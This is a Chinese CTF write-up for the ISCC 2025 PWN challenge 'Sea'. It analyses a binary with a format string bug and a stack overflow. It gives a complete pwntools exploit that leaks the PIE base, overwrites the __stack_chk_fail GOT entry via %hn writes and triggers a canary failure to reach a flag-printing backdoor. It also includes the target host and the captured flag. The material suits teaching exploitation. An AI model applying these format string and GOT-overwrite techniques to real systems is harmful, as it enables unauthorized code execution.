# Sea — 寂静之海

| 项目 | 内容 |
|------|------|
| 题目来源 | ISCC 2025 |
| 题目分类 | PWN |
| 附件 | `sea` (ELF x86-64) |
| 考点 | 格式化字符串 + 栈溢出 + GOT 覆写 |
| Flag | `ISCC{62d0908f-196e-4fdf-8a42-9c14e56a7347}` |

---

## 1. 题目分析

### 1.1 文件信息

```
$ checksec ./sea
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

64 位 ELF，开启 Canary、NX、PIE，但仅 Partial RELRO（GOT 可写）。

### 1.2 逆向分析

**main 函数** (`0x13CC`)：

```c
int main() {
    init_diagnostic_mode();
    process_emergency_command();
    return 0;
}
```

**system_reboot_comms** (`0x1229`) —— 后门函数：

```c
void system_reboot_comms() {
    puts("[+] Comm-Link Re-established. Entering Maintenance Shell.");
    fflush(stdout);
    system("cat flag.txt");
    exit(0);
}
```

直接调用即可获取 flag。关键是要劫持控制流跳转到此地址。

**process_emergency_command** (`0x130D`) —— 核心漏洞函数：

```c
unsigned __int64 process_emergency_command() {
    char buf[104];          // [rbp-0x70]
    unsigned __int64 canary; // [rbp-0x8]

    canary = __readfsqword(0x28u);
    puts("Awaiting Emergency Command (Max 256 bytes).\n");
    while (attempts > 0) {
        printf("[Remaining Attempts: %d] > ", attempts);
        read(0, buf, 0x7Cu);       // ← 栈溢出：读 124 字节到 104 字节的缓冲区
        printf(buf);                // ← 格式化字符串漏洞
        fflush(stdout);
        --attempts;
    }
    return canary ^ __readfsqword(0x28u);  // canary 校验
}
```

`attempts` 是全局变量，初始值为 2，每轮循环减 1。因此只有 **两次输入机会**。

### 1.3 漏洞总结

| 漏洞类型 | 位置 | 说明 |
|---------|------|------|
| 格式化字符串 | `printf(buf)` | 用户输入直接作为格式化字符串，可任意读写内存 |
| 栈溢出 | `read(0, buf, 0x7C)` | 读入 124 字节，但 buf 仅 104 字节，可覆盖 canary + RBP + 部分返回地址 |

---

## 2. 利用思路

由于只有两次输入机会，需要精打细算：

```
第 1 轮：格式化字符串泄露 PIE 基址
                ↓
第 2 轮：格式化字符串改写 __stack_chk_fail@GOT → system_reboot_comms
        同时栈溢出破坏 canary → 触发 __stack_chk_fail → 跳转到后门 → 拿 flag
```

### 2.1 为什么选择 `__stack_chk_fail`？

- 能改的 GOT 有 `puts`、`printf`、`fflush`、`read`、`system`、`__stack_chk_fail`、`exit` 等
- 如果改 `fflush`，则 `system_reboot_comms` 内部调用的 `fflush` 也会跳回自身，导致无限递归
- 改 `printf` 同理，`system_reboot_comms` 内部用 `puts` 而非 `printf`，但仍需考虑副作用
- `__stack_chk_fail` 是最干净的目标函数：
  1. 它只在 canary 校验失败时被调用
  2. 通过栈溢出主动破坏 canary 可以**精确触发**
  3. 改 GOT 后，canary 失败 → `__stack_chk_fail@plt` → 实际跳转到 `system_reboot_comms`
  
  > **关键洞察**：这题不是分别利用两个漏洞，而是**把两个漏洞组合成一条利用链**——格式化字符串负责写 GOT，栈溢出负责触发执行。

---

## 3. 利用步骤

### 3.1 第 1 轮：泄露 PIE 基址

在 `process_emergency_command` 的栈帧中，`[rbp-0x78]` 位置保存了一个指向只读数据段字符串的指针：

```asm
lea    rax, [rip+0xd49]   ; rax = pie_base + 0x2078  ("Awaiting Emergency Command...")
mov    [rbp-0x78], rax
```

用 `%7$p` 探测：

```python
io.sendline(b"%7$p")
leak = int(io.recvline().strip(), 16)
pie_base = leak - 0x2078
```

`%7$p` 读取第 7 个格式化参数（栈上的第 2 个 qword），恰好就是 `[rbp-0x78]` 中的指针值。

### 3.2 第 2 轮：写 GOT + 破坏 canary

格式化字符串选用 `%hn`（2 字节写入），分三次完成 48 位地址的覆写：

```python
target_got = pie_base + elf.got["__stack_chk_fail"]  # GOT 表项地址
win = pie_base + elf.symbols["system_reboot_comms"]   # 后门地址

writes = {
    target_got:       win & 0xFFFF,        # 低 2 字节
    target_got + 2:  (win >> 16) & 0xFFFF, # 中 2 字节
    target_got + 4:  (win >> 32) & 0xFFFF, # 高 2 字节
}
```

格式字符串的地址定位采用自校准算法：

1. 假设地址参数从第 N 个格式化参数开始 (`%N$hn`, `%(N+1)$hn`, `%(N+2)$hn`)
2. 构建格式字符串 → 计算对齐后的长度 → 地址实际在栈上的偏移
3. 如果偏移与假设不符，更新 N 重新构建，直到收敛

格式字符串末尾追加 3 个 8 字节地址，总负载控制在 120 字节左右（≤ `0x7C`），用 `B` 填充剩余空间覆盖 canary：

```
[格式字符串][\x00][对齐填充][addr1][addr2][addr3][BBBB...B]
                                                         ↑ 覆盖 canary 区域
```

### 3.3 触发

函数返回前检查 canary：

```asm
mov    rax, [rbp-0x8]
xor    rax, fs:0x28        ; canary 不匹配
jne    __stack_chk_fail    ; → GOT 已被改写 → system_reboot_comms
```

`system_reboot_comms` 执行 `system("cat flag.txt")`，flag 输出到 stdout。

---

## 4. 完整 EXP

```python
#!/usr/bin/env python3
from pwn import *
import re

context.arch = "amd64"
context.log_level = "info"

HOST = "39.96.193.120"
PORT = 10009

elf = ELF("./sea", checksec=False)


def build_fmt_payload(pie_base: int) -> bytes:
    target_got = pie_base + elf.got["__stack_chk_fail"]
    win = pie_base + elf.symbols["system_reboot_comms"]

    writes = {
        target_got: win & 0xFFFF,
        target_got + 2: (win >> 16) & 0xFFFF,
        target_got + 4: (win >> 32) & 0xFFFF,
    }
    ordered = sorted(writes.items(), key=lambda item: item[1])

    base_index = 16
    while True:
        printed = 0
        parts = []
        for i, (_, value) in enumerate(ordered):
            delta = (value - printed) & 0xFFFF
            if delta:
                parts.append(f"%{delta}c".encode())
            parts.append(f"%{base_index + i}$hn".encode())
            printed = value

        fmt = b"".join(parts)
        aligned = (len(fmt) + 1 + 7) & ~7
        new_base_index = 8 + aligned // 8
        if new_base_index == base_index:
            break
        base_index = new_base_index

    payload = fmt + b"\x00"
    payload = payload.ljust(aligned, b"A")
    payload += b"".join(p64(addr) for addr, _ in ordered)
    payload = payload.ljust(120, b"B")
    assert len(payload) <= 0x7C
    return payload


def main() -> None:
    io = remote(HOST, PORT)

    io.recvuntil(b"[Remaining Attempts: 2] > ")
    io.sendline(b"%7$p")
    leak = int(io.recvline().strip(), 16)
    pie_base = leak - 0x2078
    log.success(f"PIE base: {hex(pie_base)}")

    io.recvuntil(b"[Remaining Attempts: 1] > ")
    io.send(build_fmt_payload(pie_base))

    data = io.recvall(timeout=5)
    io.close()

    candidates = re.findall(rb"[A-Za-z][A-Za-z0-9_]{1,15}\{[^}\r\n]{1,200}\}", data)
    for item in dict.fromkeys(candidates):
        log.success(item.decode("ascii", errors="ignore"))


if __name__ == "__main__":
    main()
```

---

## 5. 运行结果

```
$ python3 seaexp.py
[+] Opening connection to 39.96.193.120 on port 10009: Done
[+] PIE base: 0x563d47022000
[+] Flag: ISCC{62d0908f-196e-4fdf-8a42-9c14e56a7347}
```

---

## 6. 总结与思考

1. **两个漏洞 ≠ 两次独立利用**。本题巧妙地把格式化字符串和栈溢出组合成一条链：fmt 负责"写"，溢出负责"触发"，缺一不可。
2. **GOT 覆写的目标选择**。`__stack_chk_fail` 是理想靶点——它只在异常路径被调用（canary 校验失败），不会干扰正常函数调用，避免了递归跳转等问题。
3. **Partial RELRO 是前提**。如果开启了 Full RELRO，GOT 为只读，此利用链不成立，需要另寻他法（如改 `_fini` 数组或劫持 `_IO_2_1_stdout_` vtable 等）。
4. **两次机会的限制**决定了策略必须紧凑，没有试错空间。
